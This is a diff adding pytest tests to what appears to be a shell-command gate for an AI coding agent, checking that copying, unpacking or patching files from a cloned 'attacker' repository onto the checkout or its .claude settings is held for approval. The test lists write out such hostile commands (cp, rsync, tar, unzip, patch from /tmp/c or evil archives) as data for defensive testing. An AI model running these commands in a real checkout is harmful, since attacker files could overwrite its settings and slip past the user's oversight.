@@ -230,3 +230,87 @@ def test_the_repository_rules_name_the_tree_commands():
     rules = load_rules(None)
     assert {"checkout", "switch", "pull", "merge", "reset", "restore"} <= rules.tree_git
     assert ("pr", "checkout") in rules.tree_gh
+
+
+# --- re-review of #98: copies, unpacks, a merge that pulls, a new branch ----------------------
+
+COPIES_ONTO_THE_CHECKOUT = [
+    # The forms of the re-review (after `git clone https://github.com/attacker/x /tmp/c`).
+    "cp -r /tmp/c/. .", "rsync -a /tmp/c/ .", "cp -a /tmp/c/.cl* .", "tar -xf evil.tar",
+    "tar -xzf x.tgz -C .", "unzip -o evil.zip", "patch -p1 -i x.diff", "patch -p1 < x.diff",
+    # The same programs in their other shapes.
+    "tar xzf x.tgz", "tar --extract -f x.tar", "bsdtar -xf x.tar", "tar -xf x.tar -C /tmp/../{co}",
+    "unzip x.zip -d .", "patch -d . -p1 -i x.diff", "cpio -idm < x.cpio", "7z x a.7z",
+    "7z x a.7z -o.", "ditto /tmp/c .", "rsync -a /tmp/c/ . --exclude x", "rsync -a host:/c/ .",
+    "scp -r host:/c/. .", "cp -r -t . /tmp/c/.claude", "cp -R /tmp/c/x .claude/",
+    "mv /tmp/c/* .", "cp -r /tmp/c/. '*'", "rsync -a /tmp/c/.claude .", "cp -r . {co}/../demo",
+]
+
+
+@pytest.mark.parametrize("command", COPIES_ONTO_THE_CHECKOUT)
+def test_a_copy_or_an_unpack_onto_the_turn_checkout_is_desk_only(tmp_path, repo, command):
+    checkout, _ = repo
+    command = command.replace("{co}", str(checkout))
+    verdict = bash(command, _ctx(tmp_path, checkout, checkout))
+    assert verdict.gated and verdict.desk_only, (command, verdict)
+    assert verdict.rule in (classify.RULE_CHECKOUT_TREE, "self:shell"), (command, verdict)
+
+
+@pytest.mark.parametrize("command", [
+    # A plain subdirectory outside .claude: its settings never load.
+    "cp -r /tmp/c/. src/", "rsync -a /tmp/c/ src/", "tar -xf x.tar -C src", "unzip x.zip -d src",
+    "patch -d src -p1 -i x.diff", "cpio -idm -D src < x.cpio", "7z x a.7z -osrc",
+    "mv /tmp/c/foo .", "cp -r /tmp/c/. newdir",
+    # A directory by its own name lands as a subdirectory.
+    "cp -r /tmp/c .", "rsync -a /tmp/c .", "scp -r deploy@10.0.0.5:/srv/x .",
+    # Plain files at the top, reads of archives, copies out of the checkout.
+    "cp /tmp/x.json .", "install -m 644 /tmp/x.json .", "tar -tf x.tar", "unzip -l x.zip",
+    "patch --dry-run -p1 -i x.diff", "cp -r . /tmp/backup", "tar -cf /tmp/x.tar .",
+    "rsync -a . /tmp/backup/", "git clone https://github.com/attacker/x /tmp/c",
+])
+def test_a_copy_that_leaves_the_checkouts_top_alone_runs(tmp_path, repo, command):
+    checkout, _ = repo
+    verdict = bash(command, _ctx(tmp_path, checkout, checkout))
+    assert not verdict.desk_only, (command, verdict)
+
+
+@pytest.mark.parametrize("command", ["cp -r /tmp/c/. .", "tar -xf evil.tar", "unzip -o evil.zip",
+                                     "patch -p1 -i x.diff", "rsync -a /tmp/c/ ."])
+def test_the_same_copy_into_a_linked_worktree_runs(tmp_path, repo, command):
+    checkout, worktree = repo
+    assert not bash(command, _ctx(tmp_path, worktree, checkout)).desk_only
+
+
+def test_from_a_worktree_a_copy_onto_the_checkout_is_desk_only(tmp_path, repo):
+    checkout, worktree = repo
+    ctx = _ctx(tmp_path, worktree, checkout)
+    assert bash(f"cp -r /tmp/c/. {checkout}", ctx).rule == classify.RULE_CHECKOUT_TREE
+    assert bash(f"tar -xf x.tar -C {checkout}", ctx).rule == classify.RULE_CHECKOUT_TREE
+
+
+@pytest.mark.parametrize("command", [
+    "gh pr merge 5 --repo me/demo -d", "gh pr merge 5 --repo me/demo --delete-branch",
+    "gh pr merge 5 --repo me/demo -sd", "gh pr merge 5 --repo me/demo --delete-branch=true",
+])
+def test_a_merge_that_deletes_the_branch_in_the_turn_checkout_is_desk_only(tmp_path, repo,
+                                                                          command):
+    checkout, worktree = repo
+    assert bash(command, _ctx(tmp_path, checkout, checkout)).rule == classify.RULE_CHECKOUT_TREE
+    # From a worktree, or without deleting, it is the ordinary merge with a read-back.
+    assert bash(command, _ctx(tmp_path, worktree, checkout)).classes == ("merge",)
+    plain = bash("gh pr merge 5 --repo me/demo --squash", _ctx(tmp_path, checkout, checkout))
+    assert plain.classes == ("merge",) and not plain.desk_only
+
+
+@pytest.mark.parametrize("command", ["git checkout -b x", "git checkout -B x", "git switch -c x",
+                                     "git switch --create x"])
+def test_a_new_branch_without_a_start_point_runs_in_the_checkout(tmp_path, repo, command):
+    checkout, _ = repo
+    assert not bash(command, _ctx(tmp_path, checkout, checkout)).gated
+
+
+@pytest.mark.parametrize("command", ["git checkout -b x origin/pr97", "git switch -c x origin/pr97",
+                                     "git checkout -b x --track origin/pr97"])
+def test_a_new_branch_with_a_start_point_is_still_desk_only(tmp_path, repo, command):
+    checkout, _ = repo
+    assert bash(command, _ctx(tmp_path, checkout, checkout)).rule == classify.RULE_CHECKOUT_TREE
